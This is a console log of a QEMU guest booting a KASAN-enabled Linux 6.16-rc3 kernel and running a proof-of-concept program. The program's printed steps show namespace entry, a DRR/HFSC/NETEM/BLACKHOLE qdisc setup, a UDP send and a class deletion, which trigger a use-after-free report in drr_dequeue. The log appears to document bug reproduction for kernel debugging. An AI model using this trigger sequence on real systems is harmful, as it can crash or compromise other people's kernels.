bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2J[    0.000000] Linux version 6.16.0-rc3-00136-g561aa0e22b70-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 16:51:03 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 332597012 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000308] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000326] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000328] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002716] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002721] Using GB pages for direct mapping
[    0.002911] RAMDISK: [mem 0x7fe8f000-0x7ffdffff]
[    0.002915] ACPI: Early table checksum verification disabled
[    0.002917] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002919] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002924] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002928] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002930] ACPI: FACS 0x000000007FFE0000 000040
[    0.002932] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002934] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002935] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002937] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002938] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002939] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002939] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002940] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002941] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.003145] No NUMA configuration found
[    0.003146] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.003147] NODE_DATA(0) allocated [mem 0x7fe8b900-0x7fe8efff]
[    0.003154] Zone ranges:
[    0.003155]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.003156]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.003157]   Normal   empty
[    0.003157] Movable zone start for each node
[    0.003158] Early memory node ranges
[    0.003158]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.003159]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.003160] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.003578] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.003614] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.021344] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.191844] kasan: KernelAddressSanitizer initialized
[    0.192038] ACPI: PM-Timer IO Port: 0x608
[    0.192048] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.192077] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.192079] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.192081] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.192081] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.192082] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.192083] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.192085] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.192086] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.192088] TSC deadline timer available
[    0.192090] CPU topo: Max. logical packages:   1
[    0.192091] CPU topo: Max. logical dies:       1
[    0.192092] CPU topo: Max. dies per package:   1
[    0.192093] CPU topo: Max. threads per core:   1
[    0.192094] CPU topo: Num. cores per package:     2
[    0.192095] CPU topo: Num. threads per package:   2
[    0.192095] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.192108] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.192120] kvm-guest: KVM setup pv remote TLB flush
[    0.192122] kvm-guest: setup PV sched yield
[    0.192128] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.192129] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.192130] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.192131] Booting paravirtualized kernel on KVM
[    0.192133] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.200649] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.201085] percpu: Embedded 64 pages/cpu s221912 r8192 d32040 u1048576
[    0.201116] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.201153] random: crng init done
[    0.201154] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.201236] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.201978] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.202022] Fallback order for Node 0: 0 
[    0.202024] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.202025] Policy zone: DMA32
[    0.202027] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.202028] stackdepot: allocating hash table via alloc_large_system_hash
[    0.202029] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.228437] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.229439] Dynamic Preempt: voluntary
[    0.230881] rcu: Preemptible hierarchical RCU implementation.
[    0.230882] rcu: 	RCU event tracing is enabled.
[    0.230882] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.230884] 	Trampoline variant of Tasks RCU enabled.
[    0.230885] 	Tracing variant of Tasks RCU enabled.
[    0.230885] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.230886] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.230899] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.230902] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.239110] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.239342] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.241537] Console: colour VGA+ 80x25
[    0.241566] printk: legacy console [ttyS0] enabled
[    0.279692] ACPI: Core revision 20250404
[    0.280027] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.280580] APIC: Switch to symmetric I/O mode setup
[    0.280960] x2apic enabled
[    0.281259] APIC: Switched APIC routing to: physical x2apic
[    0.281586] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.281999] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.282515] kvm-guest: setup PV IPIs
[    0.283344] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.283701] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.284273] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.285347] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.285750] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.286042] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.286277] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.286740] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.287271] ITS: Mitigation: Aligned branch/return thunks
[    0.287568] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.288030] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.288272] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.288734] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.289282] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.289714] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.290074] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.290271] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.290713] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.291271] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.291621] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.309005] Freeing SMP alternatives memory: 52K
[    0.309273] pid_max: default: 32768 minimum: 301
[    0.309582] LSM: initializing lsm=capability,selinux
[    0.309885] SELinux:  Initializing.
[    0.310221] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.310273] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.311486] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.312202] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.312291] signal: max sigframe size: 3632
[    0.312563] rcu: Hierarchical SRCU implementation.
[    0.312837] rcu: 	Max phase no-delay instances is 400.
[    0.313189] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.315226] smp: Bringing up secondary CPUs ...
[    0.315399] smpboot: x86: Booting SMP configuration:
[    0.315685] .... node  #0, CPUs:      #1
[    0.315751] smp: Brought up 1 node, 2 CPUs
[    0.316273] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.316787] Memory: 1671296K/2096632K available (52124K kernel code, 8773K rwdata, 11440K rodata, 6124K init, 1080K bss, 418464K reserved, 0K cma-reserved)
[    0.318342] devtmpfs: initialized
[    0.320365] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.320844] posixtimers hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.321279] futex hash table entries: 512 (32768 bytes on 1 NUMA nodes, total 32 KiB, linear).
[    0.321882] PM: RTC time: 16:54:13, date: 2026-05-05
[    0.322284] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.322822] audit: initializing netlink subsys (disabled)
[    0.323141] audit: type=2000 audit(1778000054.342:1): state=initialized audit_enabled=0 res=1
[    0.323141] thermal_sys: Registered thermal governor 'step_wise'
[    0.323275] cpuidle: using governor menu
[    0.323481] PCI: Using configuration type 1 for base access
[    0.324295] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.324419] HugeTLB: allocation took 0ms with hugepage_allocation_threads=1
[    0.324830] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.325226] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.327360] ACPI: Added _OSI(Module Device)
[    0.327615] ACPI: Added _OSI(Processor Device)
[    0.327876] ACPI: Added _OSI(Processor Aggregator Device)
[    0.334104] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.338022] ACPI: Interpreter enabled
[    0.338170] ACPI: PM: (supports S0 S3 S4 S5)
[    0.338273] ACPI: Using IOAPIC for interrupt routing
[    0.338600] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.339135] PCI: Using E820 reservations for host bridge windows
[    0.340609] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.354295] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.354667] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.355096] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.355323] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.356127] PCI host bridge to bus 0000:00
[    0.356294] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.356692] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.357086] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.357273] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.357718] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.358175] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.359303] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.363901] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.368287] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.369100] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.369291] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.369684] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.370044] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.370272] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.370769] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.371432] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.371855] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.372419] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.373475] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.373857] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.374216] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.374323] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.378687] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.379576] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.379923] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.380248] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.386096] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.386640] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.387353] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.388066] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.388414] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.389794] iommu: Default domain type: Translated
[    0.390091] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.391447] SCSI subsystem initialized
[    0.391855] ACPI: bus type USB registered
[    0.391855] usbcore: registered new interface driver usbfs
[    0.392274] usbcore: registered new interface driver hub
[    0.392274] usbcore: registered new device driver usb
[    0.392309] pps_core: LinuxPPS API ver. 1 registered
[    0.392598] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.393130] PTP clock support registered
[    0.398334] Advanced Linux Sound Architecture Driver Initialized.
[    0.399045] NetLabel: Initializing
[    0.399272] NetLabel:  domain hash size = 128
[    0.399528] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.399894] NetLabel:  unlabeled traffic allowed by default
[    0.400307] PCI: Using ACPI for IRQ routing
[    0.400611] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.400635] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.400971] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.401272] vgaarb: loaded
[    0.401492] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.401780] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.405310] clocksource: Switched to clocksource kvm-clock
[    0.405852] VFS: Disk quotas dquot_6.6.0
[    0.406090] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.406749] pnp: PnP ACPI init
[    0.407973] pnp: PnP ACPI: found 6 devices
[    0.417433] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.417986] NET: Registered PF_INET protocol family
[    0.418315] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.419174] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.419675] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.420131] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.420611] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.422184] TCP: Hash tables configured (established 16384 bind 16384)
[    0.422602] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.423000] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.423478] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.423997] RPC: Registered named UNIX socket transport module.
[    0.424342] RPC: Registered udp transport module.
[    0.424619] RPC: Registered tcp transport module.
[    0.424894] RPC: Registered tcp-with-tls transport module.
[    0.425215] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.425908] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.426272] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.426634] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.427035] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.427435] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.427931] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.428269] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.428643] PCI: CLS 0 bytes, default 64
[    0.428929] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.428997] Unpacking initramfs...
[    0.429420] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.431324] Initialise system trusted keyrings
[    0.433913] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.434679] NFS: Registering the id_resolver key type
[    0.434986] Key type id_resolver registered
[    0.435231] Key type id_legacy registered
[    0.435526] 9p: Installing v9fs 9p2000 file system support
[    0.442226] Key type asymmetric registered
[    0.442505] Asymmetric key parser 'x509' registered
[    0.442815] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.443259] io scheduler mq-deadline registered
[    0.443524] io scheduler kyber registered
[    0.444007] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.444550] ACPI: button: Power Button [PWRF]
[    0.444633] Freeing initrd memory: 1348K
[    0.445283] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.445812] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.450460] Non-volatile memory driver v1.3
[    0.450711] Linux agpgart interface v0.103
[    0.451058] ACPI: bus type drm_connector registered
[    0.453869] loop: module loaded
[    0.455129] scsi host0: ata_piix
[    0.455532] scsi host1: ata_piix
[    0.455816] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.456282] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.458992] e100: Intel(R) PRO/100 Network Driver
[    0.459272] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.459613] e1000: Intel(R) PRO/1000 Network Driver
[    0.459896] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.610098] ata2: found unknown device (class 0)
[    0.610817] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.611937] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.630247] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.630646] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.641819] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.778223] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.062387] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.062799] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.063245] e1000e: Intel(R) PRO/1000 Network Driver
[    1.063543] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.063920] sky2: driver version 1.30
[    1.065045] usbcore: registered new interface driver usblp
[    1.065394] usbcore: registered new interface driver usb-storage
[    1.065796] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.066769] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.067069] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.067768] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.068379] rtc_cmos 00:05: RTC can wake from S4
[    1.069228] rtc_cmos 00:05: registered as rtc0
[    1.069554] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.070628] device-mapper: ioctl: 4.50.0-ioctl (2025-04-28) initialised: dm-devel@lists.linux.dev
[    1.071167] intel_pstate: CPU model not supported
[    1.071514] hid: raw HID events driver (C) Jiri Kosina
[    1.072494] usbcore: registered new interface driver usbhid
[    1.072820] usbhid: USB HID core driver
[    1.074376] netem: version 1.3
[    1.074565] u32 classifier
[    1.074726]     input device check on
[    1.074944]     Actions configured
[    1.075352] Initializing XFRM netlink socket
[    1.075636] NET: Registered PF_INET6 protocol family
[    1.076318] Segment Routing with IPv6
[    1.076554] In-situ OAM (IOAM) with IPv6
[    1.076827] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.077409] NET: Registered PF_PACKET protocol family
[    1.077739] 9pnet: Installing 9P2000 support
[    1.078015] Key type dns_resolver registered
[    1.078492] IPI shorthand broadcast: enabled
[    1.090691] sched_clock: Marking stable (1048001106, 41923541)->(1092200007, -2275360)
[    1.091369] registered taskstats version 1
[    1.091614] Loading compiled-in X.509 certificates
[    1.100202] Demotion targets for Node 0: null
[    1.100563] PM:   Magic number: 10:955:943
[    1.100822] tty tty0: hash matches
[    1.101101] tty console: hash matches
[    1.101341] printk: legacy console [netcon0] enabled
[    1.101632] netconsole: network logging started
[    1.103851] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.104437] kworker/u8:1 (57) used greatest stack depth: 29680 bytes left
[    1.105073] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.105538] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.105972] ALSA device list:
[    1.106149]   No soundcards found.
[    1.107217] Freeing unused kernel image (initmem) memory: 6124K
[    1.107510] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.107848] cfg80211: failed to load regulatory.db
[    1.108079] Write protecting the kernel read-only data: 65536k
[    1.108578] Freeing unused kernel image (text/rodata gap) memory: 1120K
[    1.108984] Freeing unused kernel image (rodata/data gap) memory: 848K
[    1.119097] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.119403] Run /init as init process
[    1.120182] mkdir (60) used greatest stack depth: 28888 bytes left
[    1.120673] mount (61) used greatest stack depth: 28176 bytes left
[    1.122347] mount (65) used greatest stack depth: 28056 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting
poc: entered user+net namespace
poc: lo up
poc: added root DRR qdisc 1:
poc: added basic filter 1: -> 1:1
poc: added DRR class 1:1
poc: added HFSC qdisc 2:
poc: adde[    1.131732] drr_dequeue: hfsc qdisc 2: is non-work-conserving?
d HFSC class 2:1 (rt m1=8 d=1 m2=0)
poc: added [    1.132111] ==================================================================
NETEM qdisc 3:
[    1.132452] BUG: KASAN: slab-use-after-free in drr_dequeue+0x89b/0xb80
poc: added BLACK[    1.132777] Read of size 8 at addr ffff88800951b260 by task poc/67
HOLE qdisc 4:
p[    1.133082] 
oc: sent first UDP packet (seeds[    1.133215] CPU: 0 UID: 0 PID: 67 Comm: poc Not tainted 6.16.0-rc3-00136-g561aa0e22b70-dirty #1 PREEMPT(voluntary) 
 stale DRR activ[    1.133218] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
e list)
poc: de[    1.133219] Call Trace:
leted DRR class [    1.133220]  <TASK>
1:1
[    1.133221]  dump_stack_lvl+0x53/0x70
[    1.133224]  print_report+0xce/0x670
[    1.133227]  ? drr_dequeue+0x89b/0xb80
[    1.133228]  kasan_report+0xce/0x100
[    1.133230]  ? drr_dequeue+0x89b/0xb80
[    1.133232]  drr_dequeue+0x89b/0xb80
[    1.133233]  __qdisc_run+0x16f/0x18f0
[    1.133235]  ? dev_qdisc_enqueue+0x3e/0x140
[    1.133238]  __dev_queue_xmit+0x13bd/0x3220
[    1.133240]  ? __alloc_skb+0x147/0x2d0
[    1.133241]  ? __pfx___alloc_skb+0x10/0x10
[    1.133242]  ? __pfx___dev_queue_xmit+0x10/0x10
[    1.133244]  ? __pfx_selinux_ip_postroute_compat+0x10/0x10
[    1.133247]  ? selinux_ip_postroute+0x3fa/0xaf0
[    1.133249]  ip_finish_output2+0x71f/0x19a0
[    1.133251]  ? __pfx_ip_finish_output2+0x10/0x10
[    1.133252]  ? __ip_append_data+0x2220/0x4840
[    1.133254]  __ip_finish_output.part.0+0x474/0x950
[    1.133255]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    1.133257]  ? nf_hook_slow+0xa2/0x1c0
[    1.133259]  ip_output+0x25b/0x5d0
[    1.133260]  ? __ip_local_out+0x310/0x400
[    1.133261]  ? __pfx_ip_output+0x10/0x10
[    1.133262]  ? __pfx_ip_finish_output+0x10/0x10
[    1.133264]  ? ip_make_skb+0x232/0x2d0
[    1.133265]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.133266]  ip_send_skb+0x116/0x150
[    1.133267]  udp_send_skb+0x656/0x1300
[    1.133270]  udp_sendmsg+0x120d/0x1e50
[    1.133272]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.133273]  ? __pfx_udp_sendmsg+0x10/0x10
[    1.133275]  ? up_read+0x1a/0xb0
[    1.133278]  ? mutex_unlock+0x7d/0xd0
[    1.133281]  ? ldsem_up_read+0x12/0x40
[    1.133284]  __sys_sendto+0x364/0x430
[    1.133286]  ? __pfx___sys_sendto+0x10/0x10
[    1.133288]  ? alloc_fd+0x336/0x5b0
[    1.133290]  ? ksys_write+0xf7/0x1c0
[    1.133292]  ? __pfx_ksys_write+0x10/0x10
[    1.133293]  __x64_sys_sendto+0xdb/0x1b0
[    1.133295]  ? clear_bhb_loop+0x40/0x90
[    1.133297]  ? clear_bhb_loop+0x40/0x90
[    1.133298]  do_syscall_64+0xa8/0x270
[    1.133300]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.133301] RIP: 0033:0x43c213
